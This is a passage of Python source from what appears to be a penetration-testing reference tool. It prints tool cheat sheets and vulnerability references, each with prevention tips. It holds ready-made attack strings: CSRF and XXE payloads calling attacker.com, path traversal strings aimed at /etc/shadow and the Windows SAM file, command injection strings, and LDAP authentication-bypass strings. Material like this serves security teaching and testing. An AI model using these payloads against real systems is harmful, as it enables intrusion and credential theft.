                ("ettercap -T -q -i eth0 -r capture.pcap", "Read from pcap file"),
                ("ettercap -T -q -i eth0 -t tcp", "Sniff only TCP"),
                ("ettercap -T -q -i eth0 -t udp", "Sniff only UDP"),
            ],
            "Plugin Usage": [
                ("ettercap -T -q -i eth0 -P autoadd", "Auto-add new hosts"),
                ("ettercap -T -q -i eth0 -P chk_poison", "Check poisoning"),
                ("ettercap -T -q -i eth0 -P dos_attack", "DoS attack plugin"),
                ("ettercap -T -q -i eth0 -P find_conn", "Find connections"),
            ],
        }

        self._display_cheatsheet("Ettercap", commands)

    def _tcpdump_cheatsheet(self):
        """tcpdump command cheatsheet"""
        commands = {
            "Basic Capture": [
                ("tcpdump -i eth0", "Capture on interface"),
                ("tcpdump -i eth0 -w capture.pcap", "Save to file"),
                ("tcpdump -r capture.pcap", "Read from file"),
                ("tcpdump -i eth0 -c 100", "Capture only 100 packets"),
                ("tcpdump -i eth0 -s 0", "Capture full packet size"),
            ],
            "Protocol Filters": [
                ("tcpdump -i eth0 port 80", "Capture HTTP traffic"),
                ("tcpdump -i eth0 port 443", "Capture HTTPS traffic"),
                ("tcpdump -i eth0 port 22", "Capture SSH traffic"),
                ("tcpdump -i eth0 port 53", "Capture DNS traffic"),
                ("tcpdump -i eth0 tcp", "Capture only TCP"),
                ("tcpdump -i eth0 udp", "Capture only UDP"),
                ("tcpdump -i eth0 icmp", "Capture only ICMP"),
            ],
            "Host Filters": [
                ("tcpdump -i eth0 host 192.168.1.1", "Filter by host"),
                ("tcpdump -i eth0 src host 192.168.1.1", "Filter by source"),
                ("tcpdump -i eth0 dst host 192.168.1.1", "Filter by destination"),
                ("tcpdump -i eth0 net 192.168.1.0/24", "Filter by network"),
                ("tcpdump -i eth0 src net 192.168.1.0/24", "Filter by source network"),
            ],
            "Port Filters": [
                ("tcpdump -i eth0 tcp port 80", "Filter TCP port 80"),
                ("tcpdump -i eth0 portrange 20-23", "Filter port range"),
                ("tcpdump -i eth0 src port 22", "Filter source port 22"),
                ("tcpdump -i eth0 dst port 80", "Filter destination port 80"),
            ],
            "Advanced Filters": [
                ("tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'", "Capture SYN packets"),
                ("tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'", "Capture RST packets"),
                ("tcpdump -i eth0 'tcp[tcpflags] & tcp-fin != 0'", "Capture FIN packets"),
                ("tcpdump -i eth0 'tcp[tcpflags] & tcp-ack != 0'", "Capture ACK packets"),
                ("tcpdump -i eth0 'tcp[13] & 2 != 0'", "Capture SYN packets (alternative)"),
            ],
            "Content Analysis": [
                ("tcpdump -i eth0 -A", "Print packet contents in ASCII"),
                ("tcpdump -i eth0 -X", "Print packet contents in hex and ASCII"),
                ("tcpdump -i eth0 -XX", "Print packet contents in hex and ASCII (with ethernet header)"),
                ("tcpdump -i eth0 -s 0 -X port 80", "Full HTTP packet analysis"),
                ("tcpdump -i eth0 -s 0 -A port 80", "HTTP content in ASCII"),
            ],
            "Traffic Analysis": [
                ("tcpdump -i eth0 -q", "Quiet mode (less verbose)"),
                ("tcpdump -i eth0 -v", "Verbose mode"),
                ("tcpdump -i eth0 -vv", "More verbose"),
                ("tcpdump -i eth0 -vvv", "Maximum verbosity"),
                ("tcpdump -i eth0 -tttt", "Print timestamp in readable format"),
            ],
            "Security Analysis": [
                ("tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'", "SYN scan detection"),
                ("tcpdump -i eth0 'icmp[icmptype] == icmp-echo'", "Ping requests"),
                ("tcpdump -i eth0 'icmp[icmptype] == icmp-echoreply'", "Ping replies"),
                ("tcpdump -i eth0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'", "HTTP POST requests"),
            ],
            "Network Troubleshooting": [
                ("tcpdump -i eth0 -n", "Don't resolve hostnames"),
                ("tcpdump -i eth0 -nn", "Don't resolve hostnames or ports"),
                ("tcpdump -i eth0 -e", "Print ethernet header"),
                ("tcpdump -i eth0 -l", "Line buffered output"),
                ("tcpdump -i eth0 -U", "Unbuffered output"),
            ],
            "Complex Filters": [
                ("tcpdump -i eth0 'host 192.168.1.1 and port 80'", "Host AND port filter"),
                ("tcpdump -i eth0 'host 192.168.1.1 or host 192.168.1.2'", "Multiple hosts"),
                ("tcpdump -i eth0 'not port 22'", "Exclude SSH traffic"),
                ("tcpdump -i eth0 'tcp and not port 22 and not port 80'", "TCP but not SSH/HTTP"),
                ("tcpdump -i eth0 'src host 192.168.1.1 and dst port 80'", "Source host to HTTP"),
            ],
        }

        self._display_cheatsheet("tcpdump", commands)

    def _openssl_cheatsheet(self):
        """OpenSSL command cheatsheet"""
        commands = {
            "Certificate Analysis": [
                ("openssl s_client -connect example.com:443", "Connect to SSL service"),
                ("openssl x509 -in cert.pem -text -noout", "View certificate details"),
                ("openssl s_client -connect example.com:443 -servername example.com", "SNI connection"),
                ("openssl s_client -connect example.com:443 -showcerts", "Show all certificates in chain"),
                ("openssl x509 -in cert.pem -noout -dates", "Show certificate validity dates"),
                ("openssl x509 -in cert.pem -noout -subject", "Show certificate subject"),
                ("openssl x509 -in cert.pem -noout -issuer", "Show certificate issuer"),
                ("openssl x509 -in cert.pem -noout -fingerprint", "Show certificate fingerprint"),
            ],
            "Key Generation": [
                ("openssl genrsa -out private.key 2048", "Generate RSA private key"),
                ("openssl genrsa -out private.key 4096 -aes256", "Generate encrypted RSA key"),
                ("openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:2048", "Generate RSA key (new syntax)"),
                ("openssl genpkey -algorithm EC -out ec.key -pkeyopt ec_paramgen_curve:P-256", "Generate EC key"),
                ("openssl genpkey -algorithm Ed25519 -out ed25519.key", "Generate Ed25519 key"),
            ],
            "Certificate Signing": [
                ("openssl req -new -key private.key -out request.csr", "Generate CSR"),
                ("openssl req -new -key private.key -out request.csr -subj '/CN=example.com'", "Generate CSR with subject"),
                ("openssl x509 -req -in request.csr -signkey private.key -out cert.pem", "Self-sign certificate"),
                ("openssl x509 -req -in request.csr -CA ca.crt -CAkey ca.key -out cert.pem", "Sign with CA"),
                ("openssl x509 -req -in request.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out cert.pem", "Sign with CA and create serial"),
            ],
            "Hash Functions": [
                ("openssl dgst -md5 file.txt", "Calculate MD5 hash"),
                ("openssl dgst -sha1 file.txt", "Calculate SHA1 hash"),
                ("openssl dgst -sha256 file.txt", "Calculate SHA256 hash"),
                ("openssl dgst -sha512 file.txt", "Calculate SHA512 hash"),
                ("echo -n 'password' | openssl dgst -sha256", "Hash a string"),
            ],
            "Encryption/Decryption": [
                ("openssl enc -aes-256-cbc -salt -in file.txt -out file.enc", "Encrypt file with AES"),
                ("openssl enc -aes-256-cbc -d -in file.enc -out file.txt", "Decrypt AES encrypted file"),
                ("openssl enc -des3 -salt -in file.txt -out file.enc", "Encrypt with 3DES"),
                ("openssl enc -bf -salt -in file.txt -out file.enc", "Encrypt with Blowfish"),
                ("openssl enc -rc4 -in file.txt -out file.enc", "Encrypt with RC4"),
            ],
            "Base64 Encoding": [
                ("openssl base64 -in file.txt -out file.b64", "Encode to base64"),
                ("openssl base64 -d -in file.b64 -out file.txt", "Decode from base64"),
                ("echo -n 'hello' | openssl base64", "Encode string to base64"),
                ("echo -n 'aGVsbG8=' | openssl base64 -d", "Decode base64 string"),
            ],
            "Password Generation": [
                ("openssl rand -base64 32", "Generate random base64 string"),
                ("openssl rand -hex 32", "Generate random hex string"),
                ("openssl rand -out random.bin 1024", "Generate random binary file"),
                ("openssl passwd -1", "Generate Unix password hash"),
                ("openssl passwd -6", "Generate SHA512 password hash"),
            ],
            "SSL/TLS Testing": [
                ("openssl s_client -connect example.com:443 -tls1_2", "Force TLS 1.2"),
                ("openssl s_client -connect example.com:443 -tls1_3", "Force TLS 1.3"),
                ("openssl s_client -connect example.com:443 -cipher 'HIGH:!aNULL'", "Test specific ciphers"),
                ("openssl s_client -connect example.com:443 -verify_return_error", "Verify certificate"),
                ("openssl s_client -connect example.com:443 -prexit", "Print session info"),
            ],
            "Certificate Conversion": [
                ("openssl x509 -in cert.pem -outform DER -out cert.der", "Convert PEM to DER"),
                ("openssl x509 -in cert.der -inform DER -out cert.pem", "Convert DER to PEM"),
                ("openssl pkcs12 -export -in cert.pem -inkey private.key -out cert.p12", "Convert to PKCS12"),
                ("openssl pkcs12 -in cert.p12 -out cert.pem -nodes", "Extract from PKCS12"),
            ],
        }

        self._display_cheatsheet("OpenSSL", commands)

    def _curl_wget_cheatsheet(self):
        """curl/wget command cheatsheet"""
        commands = {
            "curl": [
                ("curl http://example.com", "Basic GET request"),
                ("curl -X POST -d 'data' http://example.com", "POST request"),
                ("curl -H 'User-Agent: Custom' http://example.com", "Custom headers"),
                ("curl -k https://example.com", "Ignore SSL errors"),
                ("curl -c cookies.txt http://example.com", "Save cookies"),
                ("curl -b cookies.txt http://example.com", "Use cookies"),
            ],
            "wget": [
                ("wget http://example.com", "Download file"),
                ("wget -r http://example.com", "Recursive download"),
                ("wget --user-agent='Custom' http://example.com", "Custom user agent"),
                (
                    "wget --no-check-certificate https://example.com",
                    "Ignore SSL errors",
                ),
            ],
        }

        self._display_cheatsheet("curl/wget", commands)

    def _owasp_top10_reference(self):
        """Display OWASP Top 10 vulnerabilities"""
        print("\n\033[93mOWASP TOP 10 VULNERABILITIES\033[0m")
        print("\033[93m" + "=" * 40 + "\033[0m")

        vulnerabilities = [
            ("A01:2021 - Broken Access Control", "Insufficient access controls"),
            ("A02:2021 - Cryptographic Failures", "Weak encryption implementation"),
            ("A03:2021 - Injection", "SQL, NoSQL, LDAP, OS injection"),
            ("A04:2021 - Insecure Design", "Flaws in architecture/design"),
            ("A05:2021 - Security Misconfiguration", "Poor security settings"),
            ("A06:2021 - Vulnerable Components", "Outdated/unsafe dependencies"),
            ("A07:2021 - Authentication Failures", "Weak authentication mechanisms"),
            ("A08:2021 - Software & Data Integrity", "Untrusted data/updates"),
            ("A09:2021 - Security Logging Failures", "Insufficient logging/monitoring"),
            ("A10:2021 - SSRF", "Server-Side Request Forgery"),
        ]

        for i, (vuln, desc) in enumerate(vulnerabilities, 1):
            print(f"\n\033[96m{i:2d}.\033[0m {vuln}")
            print(f"    {desc}")

    def _sql_injection_reference(self):
        """Display SQL injection reference"""
        print("\n\033[93mSQL INJECTION REFERENCE\033[0m")
        print("\033[93m" + "=" * 30 + "\033[0m")
        print("Use the SQL Injection Payload Generator for detailed payloads")

    def _xss_reference(self):
        """Display XSS reference"""
        print("\n\033[93mCROSS-SITE SCRIPTING (XSS) REFERENCE\033[0m")
        print("\033[93m" + "=" * 45 + "\033[0m")
        print("Use the XSS Payload Generator for detailed payloads")

    def _csrf_reference(self):
        """Display CSRF reference"""
        print("\n\033[93mCROSS-SITE REQUEST FORGERY (CSRF) REFERENCE\033[0m")
        print("\033[93m" + "=" * 50 + "\033[0m")

        print("\n\033[96mWhat is CSRF?\033[0m")
        print(
            "CSRF forces authenticated users to perform unwanted actions "
            "on websites they're logged into."
        )

        print("\n\033[96mCommon CSRF Payloads:\033[0m")
        payloads = [
            ("<img src='http://attacker.com/csrf'>", "Image-based CSRF"),
            ("<iframe src='http://attacker.com/csrf'></iframe>", "Iframe-based CSRF"),
            (
                "<script>document.location='http://attacker.com/csrf'</script>",
                "JavaScript-based CSRF",
            ),
        ]

        for i, (payload, desc) in enumerate(payloads, 1):
            print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
            print(f"\033[93m   Description:\033[0m {desc}")

        print("\n\033[96mPrevention:\033[0m")
        print("• Use CSRF tokens in forms")
        print("• Implement SameSite cookie attribute")
        print("• Validate Referer headers")
        print("• Use double-submit cookie pattern")

    def _buffer_overflow_reference(self):
        """Display buffer overflow reference"""
        print("\n\033[93mBUFFER OVERFLOW REFERENCE\033[0m")
        print("\033[93m" + "=" * 35 + "\033[0m")

        print("\n\033[96mWhat is Buffer Overflow?\033[0m")
        print(
            "Buffer overflow occurs when a program writes data beyond the "
            "allocated memory buffer, potentially overwriting adjacent memory."
        )

        print("\n\033[96mTypes of Buffer Overflow:\033[0m")
        types = [
            ("Stack-based Buffer Overflow", "Overwrites stack memory"),
            ("Heap-based Buffer Overflow", "Overwrites heap memory"),
            ("Integer Overflow", "Arithmetic operation exceeds data type limits"),
            ("Format String Vulnerability", "Exploits printf-style functions"),
        ]

        for i, (type_name, desc) in enumerate(types, 1):
            print(f"\n\033[94m{i}. {type_name}\033[0m")
            print(f"   {desc}")

        print("\n\033[96mCommon Vulnerable Functions:\033[0m")
        functions = [
            ("strcpy()", "No bounds checking"),
            ("strcat()", "No bounds checking"),
            ("gets()", "No bounds checking"),
            ("sprintf()", "No bounds checking"),
            ("scanf()", "No bounds checking"),
        ]

        for func, desc in functions:
            print(f"• {func} - {desc}")

        print("\n\033[96mExploitation Techniques:\033[0m")
        techniques = [
            ("NOP Sled", "Slide to shellcode"),
            ("Return Address Overwrite", "Control execution flow"),
            ("SEH Overwrite", "Structured Exception Handler"),
            ("ROP Chains", "Return-Oriented Programming"),
        ]

        for i, (tech, desc) in enumerate(techniques, 1):
            print(f"\n\033[94m{i}. {tech}\033[0m")
            print(f"   {desc}")

        print("\n\033[96mPrevention:\033[0m")
        print("• Use bounds-checking functions (strncpy, strncat)")
        print("• Enable stack canaries")
        print("• Use Address Space Layout Randomization (ASLR)")
        print("• Enable Data Execution Prevention (DEP)")
        print("• Use safe programming languages (Java, Python, C#)")

        print("\n\033[96mTools for Buffer Overflow:\033[0m")
        tools = [
            ("GDB", "GNU Debugger for analysis"),
            ("Immunity Debugger", "Windows debugging"),
            ("OllyDbg", "Windows assembly debugger"),
            ("Metasploit", "Exploit framework"),
            ("pattern_create.rb", "Create unique patterns"),
            ("pattern_offset.rb", "Find offset in pattern"),
        ]

        for tool, desc in tools:
            print(f"• {tool} - {desc}")

        print("\n\033[96mBasic Exploitation Steps:\033[0m")
        steps = [
            ("1. Fuzzing", "Find vulnerable input parameter"),
            ("2. Pattern Creation", "Create unique pattern to find offset"),
            ("3. Offset Calculation", "Determine exact buffer size"),
            ("4. Bad Character Analysis", "Identify unusable characters"),
            ("5. Shellcode Generation", "Create payload"),
            ("6. Exploit Development", "Combine all components"),
        ]

        for step, desc in steps:
            print(f"• {step} - {desc}")

    def _privilege_escalation_reference(self):
        """Display privilege escalation reference"""
        print("\n\033[93mPRIVILEGE ESCALATION REFERENCE\033[0m")
        print("\033[93m" + "=" * 40 + "\033[0m")

        print("\n\033[96mWhat is Privilege Escalation?\033[0m")
        print(
            "Privilege escalation is the act of exploiting a bug, design flaw, "
            "or configuration oversight to gain elevated access to resources."
        )

        print("\n\033[96mTypes of Privilege Escalation:\033[0m")
        types = [
            ("Horizontal Privilege Escalation", "Access other users' accounts"),
            ("Vertical Privilege Escalation", "Access higher privilege levels"),
        ]

        for i, (type_name, desc) in enumerate(types, 1):
            print(f"\n\033[94m{i}. {type_name}\033[0m")
            print(f"   {desc}")

        print("\n\033[96mLinux Privilege Escalation:\033[0m")
        linux_techniques = [
            ("SUID Binaries", "Find and exploit SUID executables"),
            ("Sudo Misconfiguration", "Exploit sudo privileges"),
            ("Kernel Exploits", "Exploit kernel vulnerabilities"),
            ("Cron Jobs", "Exploit scheduled tasks"),
            ("PATH Manipulation", "Modify PATH environment"),
            ("Library Hijacking", "Hijack shared libraries"),
            ("Capabilities", "Exploit Linux capabilities"),
            ("Docker Escape", "Escape from containers"),
        ]

        for i, (tech, desc) in enumerate(linux_techniques, 1):
            print(f"\n\033[94m{i}. {tech}\033[0m")
            print(f"   {desc}")

        print("\n\033[96mWindows Privilege Escalation:\033[0m")
        windows_techniques = [
            ("Token Manipulation", "Manipulate access tokens"),
            ("Service Exploitation", "Exploit Windows services"),
            ("Registry Exploitation", "Modify registry keys"),
            ("Scheduled Tasks", "Exploit scheduled tasks"),
            ("DLL Hijacking", "Hijack DLL files"),
            ("Unquoted Service Paths", "Exploit path issues"),
            ("AlwaysInstallElevated", "Exploit installation policies"),
            ("Pass the Hash", "Use hash authentication"),
        ]

        for i, (tech, desc) in enumerate(windows_techniques, 1):
            print(f"\n\033[94m{i}. {tech}\033[0m")
            print(f"   {desc}")

        print("\n\033[96mCommon Enumeration Commands:\033[0m")
        print("\n\033[95mLinux:\033[0m")
        linux_commands = [
            ("find / -perm -u=s -type f 2>/dev/null", "Find SUID binaries"),
            ("sudo -l", "List sudo privileges"),
            ("cat /etc/crontab", "View cron jobs"),
            ("env", "View environment variables"),
            ("ps aux", "List running processes"),
            ("netstat -tulpn", "List network connections"),
            ("cat /etc/passwd", "View user accounts"),
            ("uname -a", "Kernel version"),
        ]

        for cmd, desc in linux_commands:
            print(f"• {cmd} - {desc}")

        print("\n\033[95mWindows:\033[0m")
        windows_commands = [
            ("whoami /priv", "View user privileges"),
            ("net user", "List users"),
            ("net localgroup administrators", "List administrators"),
            ("sc query", "List services"),
            ("tasklist", "List running processes"),
            ("netstat -an", "List network connections"),
            ("reg query HKLM", "Query registry"),
            ("schtasks", "List scheduled tasks"),
        ]

        for cmd, desc in windows_commands:
            print(f"• {cmd} - {desc}")

        print("\n\033[96mTools for Privilege Escalation:\033[0m")
        tools = [
            ("LinPEAS", "Linux privilege escalation script"),
            ("WinPEAS", "Windows privilege escalation script"),
            ("Linux Exploit Suggester", "Find kernel exploits"),
            ("Windows Exploit Suggester", "Find Windows exploits"),
            ("PowerSploit", "PowerShell exploitation framework"),
            ("Mimikatz", "Credential extraction"),
            ("BloodHound", "Active Directory analysis"),
        ]

        for tool, desc in tools:
            print(f"• {tool} - {desc}")

        print("\n\033[96mPrevention:\033[0m")
        print("• Principle of least privilege")
        print("• Regular security updates")
        print("• Disable unnecessary services")
        print("• Use strong authentication")
        print("• Monitor system logs")
        print("• Implement access controls")

    def _path_traversal_reference(self):
        """Display path traversal reference"""
        print("\n\033[93mPATH TRAVERSAL REFERENCE\033[0m")
        print("\033[93m" + "=" * 35 + "\033[0m")

        print("\n\033[96mWhat is Path Traversal?\033[0m")
        print(
            "Path traversal allows attackers to access files outside the "
            "intended directory by manipulating file paths."
        )

        print("\n\033[96mCommon Path Traversal Payloads:\033[0m")
        payloads = [
            ("../../../etc/passwd", "Access system files"),
            (
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "Access Windows system files",
            ),
            ("....//....//....//etc/passwd", "Double encoding bypass"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoding"),
            ("..%252f..%252f..%252fetc%252fpasswd", "Double URL encoding"),
            ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "Unicode encoding"),
        ]

        for i, (payload, desc) in enumerate(payloads, 1):
            print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
            print(f"\033[93m   Description:\033[0m {desc}")

        print("\n\033[96mVulnerable Functions:\033[0m")
        functions = [
            ("file_get_contents()", "PHP file reading"),
            ("include()", "PHP file inclusion"),
            ("require()", "PHP file inclusion"),
            ("fopen()", "File opening"),
            ("readfile()", "File reading"),
        ]

        for func, desc in functions:
            print(f"• {func} - {desc}")

        print("\n\033[96mBypass Techniques:\033[0m")
        bypasses = [
            ("Double Encoding", "Encode characters twice"),
            ("Unicode Encoding", "Use Unicode characters"),
            ("Null Byte Injection", "Add null bytes"),
            ("Directory Traversal", "Use different path separators"),
            ("Case Manipulation", "Change case of characters"),
        ]

        for i, (bypass, desc) in enumerate(bypasses, 1):
            print(f"\n\033[94m{i}. {bypass}\033[0m")
            print(f"   {desc}")

        print("\n\033[96mTarget Files:\033[0m")
        target_files = [
            ("/etc/passwd", "User account information"),
            ("/etc/shadow", "Password hashes"),
            ("/etc/hosts", "Hostname mappings"),
            ("/proc/version", "Kernel version"),
            ("/proc/cpuinfo", "CPU information"),
            ("C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows hosts file"),
            ("C:\\Windows\\System32\\config\\SAM", "Windows SAM file"),
        ]

        for file_path, desc in target_files:
            print(f"• {file_path} - {desc}")

        print("\n\033[96mPrevention:\033[0m")
        print("• Validate and sanitize file paths")
        print("• Use whitelist approach for allowed files")
        print("• Implement proper access controls")
        print("• Use secure file handling functions")
        print("• Regular security testing")

    def _command_injection_reference(self):
        """Display command injection reference"""
        print("\n\033[93mCOMMAND INJECTION REFERENCE\033[0m")
        print("\033[93m" + "=" * 40 + "\033[0m")

        print("\n\033[96mWhat is Command Injection?\033[0m")
        print(
            "Command injection allows attackers to execute arbitrary commands "
            "on the host operating system via a vulnerable application."
        )

        print("\n\033[96mCommon Command Injection Payloads:\033[0m")
        payloads = [
            ("; ls -la", "List files"),
            ("| whoami", "Show current user"),
            ("&& id", "Show user ID"),
            ("|| cat /etc/passwd", "Alternative execution"),
            ("`whoami`", "Command substitution"),
            ("$(whoami)", "Command substitution"),
            ("%0a whoami", "URL encoded newline"),
            ("%3b whoami", "URL encoded semicolon"),
        ]

        for i, (payload, desc) in enumerate(payloads, 1):
            print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
            print(f"\033[93m   Description:\033[0m {desc}")

        print("\n\033[96mVulnerable Functions:\033[0m")
        functions = [
            ("system()", "Execute system commands"),
            ("exec()", "Execute commands"),
            ("shell_exec()", "Execute shell commands"),
            ("passthru()", "Execute commands"),
            ("popen()", "Open process file pointer"),
        ]

        for func, desc in functions:
            print(f"• {func} - {desc}")

        print("\n\033[96mBypass Techniques:\033[0m")
        bypasses = [
            ("Character Encoding", "Encode special characters"),
            ("Case Manipulation", "Change command case"),
            ("Alternative Commands", "Use different commands"),
            ("Whitespace Manipulation", "Use tabs or newlines"),
            ("Environment Variables", "Use $IFS for spaces"),
        ]

        for i, (bypass, desc) in enumerate(bypasses, 1):
            print(f"\n\033[94m{i}. {bypass}\033[0m")
            print(f"   {desc}")

        print("\n\033[96mUseful Commands for Reconnaissance:\033[0m")
        commands = [
            ("whoami", "Current user"),
            ("id", "User and group information"),
            ("pwd", "Current directory"),
            ("ls -la", "List files with details"),
            ("cat /etc/passwd", "User accounts"),
            ("uname -a", "System information"),
            ("ps aux", "Running processes"),
            ("netstat -tulpn", "Network connections"),
        ]

        for cmd, desc in commands:
            print(f"• {cmd} - {desc}")

        print("\n\033[96mPrevention:\033[0m")
        print("• Avoid command execution functions")
        print("• Use parameterized APIs")
        print("• Implement input validation")
        print("• Use whitelist approach")
        print("• Run with minimal privileges")

    def _xxe_reference(self):
        """Display XXE reference"""
        print("\n\033[93mXML EXTERNAL ENTITY (XXE) REFERENCE\033[0m")
        print("\033[93m" + "=" * 50 + "\033[0m")

        print("\n\033[96mWhat is XXE?\033[0m")
        print(
            "XXE attacks occur when weakly configured XML parsers support "
            "XML features that allow external entity references."
        )

        print("\n\033[96mCommon XXE Payloads:\033[0m")
        payloads = [
            (
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
                "Basic file read",
            ),
            (
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><test>&xxe;</test>",
                "External DTD inclusion",
            ),
            (
                "<!DOCTYPE test [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]><test>&evil;</test>",
                "Parameter entity",
            ),
            (
                "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
                "Complete XML document",
            ),
        ]

        for i, (payload, desc) in enumerate(payloads, 1):
            print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
            print(f"\033[93m   Description:\033[0m {desc}")

        print("\n\033[96mVulnerable XML Parsers:\033[0m")
        parsers = [
            ("libxml2", "C library"),
            ("Expat", "C library"),
            ("Xerces", "C++ library"),
            ("DOM4J", "Java library"),
            ("JDOM", "Java library"),
            ("SimpleXML", "PHP extension"),
        ]

        for parser, desc in parsers:
            print(f"• {parser} - {desc}")

        print("\n\033[96mXXE Attack Types:\033[0m")
        attack_types = [
            ("File Read", "Read local files"),
            ("Server-Side Request Forgery", "Make HTTP requests"),
            ("Denial of Service", "Billion laughs attack"),
            ("Out-of-Band Data Exfiltration", "Exfiltrate data via DNS/HTTP"),
        ]

        for i, (attack_type, desc) in enumerate(attack_types, 1):
            print(f"\n\033[94m{i}. {attack_type}\033[0m")
            print(f"   {desc}")

        print("\n\033[96mTarget Files:\033[0m")
        target_files = [
            ("/etc/passwd", "User accounts"),
            ("/etc/hosts", "Hostname mappings"),
            ("/proc/version", "Kernel version"),
            ("C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows hosts file"),
            ("file:///dev/random", "Random data (DoS)"),
        ]

        for file_path, desc in target_files:
            print(f"• {file_path} - {desc}")

        print("\n\033[96mPrevention:\033[0m")
        print("• Disable external entity processing")
        print("• Use secure XML parsers")
        print("• Implement input validation")
        print("• Use whitelist approach")
        print("• Regular security testing")

    def _insecure_deserialization_reference(self):
        """Display insecure deserialization reference"""
        print("\n\033[93mINSECURE DESERIALIZATION REFERENCE\033[0m")
        print("\033[93m" + "=" * 50 + "\033[0m")

        print("\n\033[96mWhat is Insecure Deserialization?\033[0m")
        print(
            "Insecure deserialization occurs when applications deserialize "
            "untrusted data, potentially leading to remote code execution."
        )

        print("\n\033[96mVulnerable Functions:\033[0m")
        functions = [
            ("unserialize()", "PHP deserialization"),
            ("pickle.loads()", "Python deserialization"),
            ("ObjectInputStream.readObject()", "Java deserialization"),
            ("JSON.parse()", "JavaScript deserialization"),
        ]

        for func, desc in functions:
            print(f"• {func} - {desc}")

        print("\n\033[96mPrevention:\033[0m")
        print("• Avoid deserializing untrusted data")
        print("• Use secure serialization formats")
        print("• Implement input validation")
        print("• Use whitelist approach")
        print("• Regular security testing")

    def _generate_command_injection_payloads(self):
        """Generate command injection payloads"""
        print("\n\033[93mCOMMAND INJECTION PAYLOADS\033[0m")
        print("\033[93m" + "=" * 35 + "\033[0m")
        print("Use the Command Injection Reference for detailed information")

    def _generate_path_traversal_payloads(self):
        """Generate path traversal payloads"""
        print("\n\033[93mPATH TRAVERSAL PAYLOADS\033[0m")
        print("\033[93m" + "=" * 35 + "\033[0m")
        print("Use the Path Traversal Reference for detailed information")

    def _generate_ldap_payloads(self):
        """Generate LDAP injection payloads"""
        print("\n\033[93mLDAP INJECTION PAYLOADS\033[0m")
        print("\033[93m" + "=" * 35 + "\033[0m")

        payloads = {
            "Authentication Bypass": [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "*))%00",
                "admin)(&)",
                "admin*)(&)",
            ],
            "Information Disclosure": [
                "*)(objectClass=*",
                "*)(|(objectClass=*))",
                "*)(|(cn=*))",
                "*)(|(uid=*))",
            ],
        }

        self._display_payload_list("LDAP Injection Payloads", payloads)

    def _generate_xxe_payloads(self):
        """Generate XXE payloads"""
        print("\n\033[93mXXE PAYLOADS\033[0m")
        print("\033[93m" + "=" * 20 + "\033[0m")
        print("Use the XXE Reference for detailed information")

    def _port_numbers_reference(self):
        """Display common port numbers reference"""
        print("\n\033[93mCOMMON PORT NUMBERS REFERENCE\033[0m")
        print("\033[93m" + "=" * 45 + "\033[0m")

        ports = {
            "Web Services": [
                ("80", "HTTP"),
                ("443", "HTTPS"),
                ("8080", "HTTP Alternative"),
                ("8443", "HTTPS Alternative"),
            ],
            "Remote Access": [
                ("22", "SSH"),
                ("23", "Telnet"),
                ("3389", "RDP"),
                ("5900", "VNC"),
            ],
            "File Transfer": [
                ("21", "FTP"),
                ("22", "SFTP"),
                ("989", "FTPS Data"),
                ("990", "FTPS Control"),
            ],
            "Email Services": [
                ("25", "SMTP"),
                ("110", "POP3"),
                ("143", "IMAP"),
                ("587", "SMTP Submission"),
                ("993", "IMAPS"),
                ("995", "POP3S"),
            ],
            "Database Services": [
                ("1433", "MSSQL"),
                ("3306", "MySQL"),
                ("5432", "PostgreSQL"),
                ("1521", "Oracle"),
                ("6379", "Redis"),
                ("27017", "MongoDB"),
            ],
            "Network Services": [
                ("53", "DNS"),
                ("67", "DHCP Server"),
                ("68", "DHCP Client"),
                ("123", "NTP"),
                ("161", "SNMP"),
                ("389", "LDAP"),
                ("636", "LDAPS"),
            ],
        }

        for category, port_list in ports.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))
            for port, service in port_list:
                print(f"• {port} - {service}")

    def _network_recon_reference(self):
        """Display network reconnaissance reference"""
        print("\n\033[93mNETWORK RECONNAISSANCE REFERENCE\033[0m")
        print("\033[93m" + "=" * 50 + "\033[0m")

        print("\n\033[96mNetwork Discovery:\033[0m")
        discovery_commands = [
            ("nmap -sn 192.168.1.0/24", "Ping sweep"),
            ("arp-scan --localnet", "ARP scan"),
            ("netdiscover -r 192.168.1.0/24", "Passive discovery"),
            ("masscan 192.168.1.0/24 -p 80,443", "Fast port scan"),
        ]

        for cmd, desc in discovery_commands:
            print(f"• {cmd} - {desc}")

        print("\n\033[96mService Enumeration:\033[0m")
        service_commands = [
            ("nmap -sV -p 1-1000 192.168.1.1", "Version detection"),
            ("nmap --script banner -p 1-1000 192.168.1.1", "Banner grabbing"),
            ("nmap --script vuln 192.168.1.1", "Vulnerability scan"),
            ("nmap --script default 192.168.1.1", "Default scripts"),
        ]

        for cmd, desc in service_commands:
            print(f"• {cmd} - {desc}")

    def _wireless_security_reference(self):
        """Display wireless security reference"""
        print("\n\033[93mWIRELESS SECURITY REFERENCE\033[0m")
        print("\033[93m" + "=" * 45 + "\033[0m")

